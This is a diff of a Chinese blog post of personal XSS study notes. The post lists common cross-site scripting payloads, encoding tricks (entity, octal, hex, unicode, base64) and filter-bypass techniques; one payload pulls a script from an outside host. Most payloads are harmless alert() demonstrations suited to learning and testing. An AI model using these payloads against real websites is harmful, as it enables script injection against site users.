@@ -91,18 +91,18 @@
 
 
 
-<meta name="description" content="xss常用payload1&amp;#39; onclick=alert(1) name=&amp;#39;21&amp;quot; onclick=alert(1) name=&amp;quot;2&amp;lt;img src=1 onerror=alert(/xss/)&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#39;);alert(1)(&amp;#39;&amp;amp;lt;script&amp;amp;g">
+<meta name="description" content="xss常用payload1&amp;#39; onclick=alert(1) name=&amp;#39;21&amp;quot; onclick=alert(1) name=&amp;quot;2&amp;lt;img src=1 onerror=alert(/xss/)&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;amp;l">
 <meta name="keywords" content="笔记">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS学习笔记">
 <meta property="og:url" content="http://yoursite.com/2017/09/20/XSS学习笔记/index.html">
 <meta property="og:site_name" content="zgjx的博客">
-<meta property="og:description" content="xss常用payload1&amp;#39; onclick=alert(1) name=&amp;#39;21&amp;quot; onclick=alert(1) name=&amp;quot;2&amp;lt;img src=1 onerror=alert(/xss/)&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#39;);alert(1)(&amp;#39;&amp;amp;lt;script&amp;amp;g">
+<meta property="og:description" content="xss常用payload1&amp;#39; onclick=alert(1) name=&amp;#39;21&amp;quot; onclick=alert(1) name=&amp;quot;2&amp;lt;img src=1 onerror=alert(/xss/)&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;amp;l">
 <meta property="og:image" content="http://yoursite.com/2017/09/20/XSS学习笔记/%3C/comment">
-<meta property="og:updated_time" content="2018-05-08T09:30:31.412Z">
+<meta property="og:updated_time" content="2018-06-08T02:42:44.404Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS学习笔记">
-<meta name="twitter:description" content="xss常用payload1&amp;#39; onclick=alert(1) name=&amp;#39;21&amp;quot; onclick=alert(1) name=&amp;quot;2&amp;lt;img src=1 onerror=alert(/xss/)&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#39;);alert(1)(&amp;#39;&amp;amp;lt;script&amp;amp;g">
+<meta name="twitter:description" content="xss常用payload1&amp;#39; onclick=alert(1) name=&amp;#39;21&amp;quot; onclick=alert(1) name=&amp;quot;2&amp;lt;img src=1 onerror=alert(/xss/)&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;amp;l">
 <meta name="twitter:image" content="http://yoursite.com/2017/09/20/XSS学习笔记/%3C/comment">
 
 
@@ -363,7 +363,7 @@
       
 
       
-        <h2 id="xss常用payload"><a href="#xss常用payload" class="headerlink" title="xss常用payload"></a>xss常用payload</h2><p><code>1&#39; onclick=alert(1) name=&#39;2</code><br><code>1&quot; onclick=alert(1) name=&quot;2</code><br><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code><br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&#39;);alert(1)(&#39;</code><br><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code><br><code>&lt;/textarea&gt;&lt;img src=1 onerror=alert(/xss/)&gt;&lt;textarea&gt;</code><br><code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code><br><code>&lt;table background=&#39;javascript.:alert(1)&#39;&gt;&lt;/table&gt;</code><br><code>&lt;object type=text/html data=&#39;javascript.:alert(1);&#39;&gt;&lt;/object&gt;</code><br><code>1&#39; onclick=alert(1) name=&#39;1</code><br><code>&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;</code><br><code>&lt;br size=&quot;&amp;{alert(&#39;XSS&#39;)}&quot;&gt;</code><br><code>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</code><br><code>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#39;XSS&#39;);&quot;&gt;</code><br><code>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#39;XSS&#39;))&quot;&gt;</code><br><code>&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;</code><br><code>&lt;IMG STYLE=&#39;xss:expre\ssion(alert(&quot;XSS&quot;))&#39;&gt;</code></p>
+        <h2 id="xss常用payload"><a href="#xss常用payload" class="headerlink" title="xss常用payload"></a>xss常用payload</h2><p><code>1&#39; onclick=alert(1) name=&#39;2</code><br><code>1&quot; onclick=alert(1) name=&quot;2</code><br><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code><br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>%3Cscript%3Ealert(1)%3C%2Fscript%3E</code><br><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code><br><code>&#39;);alert(1)(&#39;</code><br><code>&lt;/textarea&gt;&lt;img src=1 onerror=alert(/xss/)&gt;&lt;textarea&gt;</code><br><code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code><br><code>&lt;table background=&#39;javascript.:alert(1)&#39;&gt;&lt;/table&gt;</code><br><code>&lt;object type=text/html data=&#39;javascript.:alert(1);&#39;&gt;&lt;/object&gt;</code><br><code>1&#39; onclick=alert(1) name=&#39;1</code><br><code>&lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt;</code><br><code>&lt;br size=&quot;&amp;{alert(&#39;XSS&#39;)}&quot;&gt;</code><br><code>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</code><br><code>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#39;XSS&#39;);&quot;&gt;</code><br><code>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#39;XSS&#39;))&quot;&gt;</code><br><code>&lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt;</code><br><code>&lt;IMG STYLE=&#39;xss:expre\ssion(alert(&quot;XSS&quot;))&#39;&gt;</code></p>
 <h2 id="xss编码"><a href="#xss编码" class="headerlink" title="xss编码"></a>xss编码</h2><p>XSS Encode.crx<br><a href="http://su.xmd5.org/static/drops/tips-689.html" target="_blank" rel="external">XSS与字符编码的那些事儿</a><br><code>1&#39; onclick=alert(1) name=&#39;2</code><br>url编码<br><code>1&#39; onclick=alert%1%29 name=&#39;2</code><br>html实体编码(10进制)<br><code>1&#39; onclick=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; name=&#39;2</code><br>html实体编码(16进制)<br><code>1&#39; onclick=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; name=&#39;2</code><br>新增的实体编码<br><code>1&#39; onclick=&quot;javas&amp;NewLine;cript&amp;colon;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot; name=&#39;2</code><br>javascript的八进制<br><code>1&#39; onclick=eval(&#39;\141\154\145\162\164\50\61\51&#39;) name=&#39;2</code><br>javascript的十六进制<br><code>1&#39; onclick=eval(&#39;\x61\x6c\x65\x72\x74\x28\x31\x29&#39;) name=&#39;2</code><br>unicode编码<br><code>1&#39; onclick=eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&#39;) name=&#39;2</code><br>fromCharCode<br><code>1&#39; onclick=eval(String.fromCharCode(97,108,101,114,116,40,49,41))  name=&#39;2</code><br>base64编码<br><code>&lt;a href=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt;</code><br><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></p>
 <h2 id="xss绕过"><a href="#xss绕过" class="headerlink" title="xss绕过"></a>xss绕过</h2><p>使用form-data<br>编码、多重编码<br>单双引号<br>空格或引号使用/代替<br>大小写、空格、换行<br>CSS注入<br>注释,标记混乱:<!--<img src="-->,<comment><img src="</comment">(IE),<style>&lt;img src=”</style><br>样式标签中的\和结束符\0也是被浏览器忽略，如<code>@\0im\port&#39;\0ja\vasc\ript:alert(&quot;xss&quot;)&#39;;@\i\0m\00p\000o\0000\00000r\000000t&quot;url&quot;;</code><br>脚本加密（Script Encoder）,包括 JScript 和VBScript,经过加密的脚本，能在IE下正常运行，在其他浏览器下则不识别。<br>拆分跨站法</comment></p>
 <h2 id="xss常见过滤字符"><a href="#xss常见过滤字符" class="headerlink" title="xss常见过滤字符"></a>xss常见过滤字符</h2><p>‘“ &lt;&gt;&amp;\<br>关键字</p>
@@ -410,8 +410,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/25/ruby gem通过修改文件配置代理/" rel="next" title="ruby中rails的gem和bundle配置系统代理">
-                <i class="fa fa-chevron-left"></i> ruby中rails的gem和bundle配置系统代理
+              <a href="/2017/08/25/railsinstaller安装后执行rails提示系统找不到指定的路径的解决办法/" rel="next" title="railsinstaller安装后执行rails提示系统找不到指定的路径的解决办法">
+                <i class="fa fa-chevron-left"></i> railsinstaller安装后执行rails提示系统找不到指定的路径的解决办法
               </a>
             
           </div>
